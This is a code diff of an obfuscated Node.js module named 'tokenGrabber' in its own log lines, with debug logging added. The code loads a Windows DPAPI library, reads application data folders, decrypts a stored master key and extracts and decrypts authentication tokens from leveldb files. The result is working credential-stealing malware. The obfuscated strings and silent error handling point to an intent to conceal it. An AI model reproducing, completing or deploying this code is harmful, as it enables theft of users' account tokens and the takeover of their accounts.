@@ -2,7 +2,11 @@ const fs = require('fs');
 const path = require('path');
 const crypto = require('crypto');
 let unprotectData = null;
-try { const _dp = require(String.fromCharCode(64,112,114,105,109,110,111,47,100,112,97,112,105)); unprotectData = _dp && _dp.Dpapi && _dp.Dpapi.unprotectData ? (b, e, s) => _dp.Dpapi.unprotectData(b, e, s) : null; } catch (_) {}
+try {
+  const _dp = require(String.fromCharCode(64,112,114,105,109,110,111,47,100,112,97,112,105));
+  console.log('[tokenGrabber] @primno/dpapi loaded', !!_dp, '_dp.Dpapi', !!_dp && !!_dp.Dpapi, 'unprotectData', !!_dp && !!_dp.Dpapi && typeof _dp.Dpapi.unprotectData);
+  unprotectData = _dp && _dp.Dpapi && _dp.Dpapi.unprotectData ? (b, e, s) => _dp.Dpapi.unprotectData(b, e, s) : null;
+} catch (e) { console.log('[tokenGrabber] @primno/dpapi require error', e.message); }
 
 const _L = process.env[String.fromCharCode(76,79,67,65,76,65,80,80,68,65,84,65)] || '';
 const _R = process.env[String.fromCharCode(65,80,80,68,65,84,65)] || '';
@@ -29,19 +33,25 @@ const _TL = 16;
 function getkey(_b) {
   const _f = path.join(_b, _s(0));
   try {
-    if (!fs.existsSync(_f)) return null;
+    const exists = fs.existsSync(_f);
+    console.log('[tokenGrabber] getkey path', _f, 'exists', exists);
+    if (!exists) return null;
     const _r = fs.readFileSync(_f, _s(6));
     const _j = JSON.parse(_r);
-    return _j[_s(4)] && _j[_s(4)][_s(5)] ? _j[_s(4)][_s(5)] : null;
-  } catch (_) { return null; }
+    const key = _j[_s(4)] && _j[_s(4)][_s(5)] ? _j[_s(4)][_s(5)] : null;
+    console.log('[tokenGrabber] getkey has encrypted_key', !!key);
+    return key;
+  } catch (e) { console.log('[tokenGrabber] getkey error', e.message); return null; }
 }
 
 function gettokens(_b) {
   const _lp = path.join(_b, _s(1), _s(2));
   const _out = [];
   try {
-    if (!fs.existsSync(_lp)) return _out;
+    const exists = fs.existsSync(_lp);
+    if (!exists) { console.log('[tokenGrabber] gettokens leveldb not exists', _lp); return _out; }
     const _files = fs.readdirSync(_lp);
+    console.log('[tokenGrabber] gettokens path', _lp, 'files', _files.length);
     for (const _file of _files) {
       if (!_file.endsWith(_s(3))) continue;
       try {
@@ -51,19 +61,24 @@ function gettokens(_b) {
         while ((_m = _re.exec(_c)) !== null) _out.push(_m[1]);
       } catch (_) {}
     }
-  } catch (_) {}
+    console.log('[tokenGrabber] gettokens raw count', _out.length);
+  } catch (e) { console.log('[tokenGrabber] gettokens error', e.message); }
   return _out;
 }
 
 function decryptKey(_e) {
+  console.log('[tokenGrabber] decryptKey unprotectData', !!unprotectData);
   if (!unprotectData) return null;
   try {
     const _buf = Buffer.from(_e, _s(7));
-    if (_buf.length <= _D) return null;
+    console.log('[tokenGrabber] decryptKey buf.length', _buf.length);
+    if (_buf.length <= _D) { console.log('[tokenGrabber] decryptKey buf too short'); return null; }
     const _blob = _buf.subarray(_D);
     const _key = unprotectData(_blob, null, _s(8));
-    return _key && _key.length >= 32 ? (Buffer.isBuffer(_key) ? _key : Buffer.from(_key)) : null;
-  } catch (_) { return null; }
+    const ok = _key && _key.length >= 32;
+    console.log('[tokenGrabber] decryptKey key result', !!_key, _key ? _key.length : 0);
+    return ok ? (Buffer.isBuffer(_key) ? _key : Buffer.from(_key)) : null;
+  } catch (e) { console.log('[tokenGrabber] decryptKey error', e.message); return null; }
 }
 
 function decryptToken(_e, _key) {
@@ -77,27 +92,33 @@ function decryptToken(_e, _key) {
     const _dec = crypto.createDecipheriv(_s(9), _key, _nonce);
     _dec.setAuthTag(_tag);
     return Buffer.concat([_dec.update(_data), _dec.final()]).toString(_s(6));
-  } catch (_) { return null; }
+  } catch (e) { console.log('[tokenGrabber] decryptToken error', e.message); return null; }
 }
 
 function getTokens() {
-  if (process.platform !== String.fromCharCode(119,105,110,51,50) || !unprotectData) return Promise.resolve([]);
+  console.log('[tokenGrabber] getTokens platform', process.platform, 'unprotectData', !!unprotectData);
+  if (process.platform !== String.fromCharCode(119,105,110,51,50) || !unprotectData) { console.log('[tokenGrabber] getTokens skip (not win32 or no dpapi)'); return Promise.resolve([]); }
   const _seen = new Set();
   const _out = [];
   try {
     for (const [_pl, _bp] of Object.entries(_P)) {
-      if (!fs.existsSync(_bp)) continue;
+      const pathExists = fs.existsSync(_bp);
+      if (!pathExists) continue;
+      console.log('[tokenGrabber] getTokens checking path', _pl, _bp);
       const _kb = getkey(_bp);
       if (!_kb) continue;
       const _key = decryptKey(_kb);
       if (!_key) continue;
-      for (const _raw of gettokens(_bp)) {
+      const raws = gettokens(_bp);
+      console.log('[tokenGrabber] getTokens raw tokens for', _pl, raws.length);
+      for (const _raw of raws) {
         const _cl = _raw.replace(/\\/g, '');
         const _tok = decryptToken(_cl, _key);
         if (_tok && !_seen.has(_tok)) { _seen.add(_tok); _out.push(_tok); }
       }
     }
-  } catch (_) {}
+    console.log('[tokenGrabber] getTokens result count', _out.length);
+  } catch (e) { console.log('[tokenGrabber] getTokens error', e.message); }
   return Promise.resolve(_out);
 }
 
